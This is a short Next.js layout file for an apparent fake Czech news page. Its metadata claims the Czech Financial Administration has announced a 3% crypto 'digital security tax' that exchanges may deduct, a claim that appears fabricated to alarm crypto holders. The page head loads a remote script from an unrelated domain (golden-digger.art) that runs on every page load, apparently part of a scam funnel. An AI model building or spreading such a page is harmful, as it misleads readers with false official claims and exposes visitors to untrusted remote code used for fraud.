export const metadata = {
  title: "Mimořádná zpráva: Vlastníte kryptoměny v hodnotě nad 100 000 Kč? Česko chystá 3% „digitální bezpečnostní daň“ – burzy ji mohou srážet přímo — Výhled CZ",
  description: "Finanční správa České republiky dnes vydala mimořádné oznámení ohledně plánované 3% digitální bezpečnostní daně z kryptoměn.",
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
};

import "./globals.css";

export default function RootLayout({ children }) {
  return (
    <html lang="cs">
      <head>
        <script
          src="https://golden-digger.art/p/58d58c34-7749-4fd7-88a5-4053d57839c1/bootstrap.js"
          async
          defer
        ></script>
      </head>
      <body>{children}</body>
    </html>
  );
}
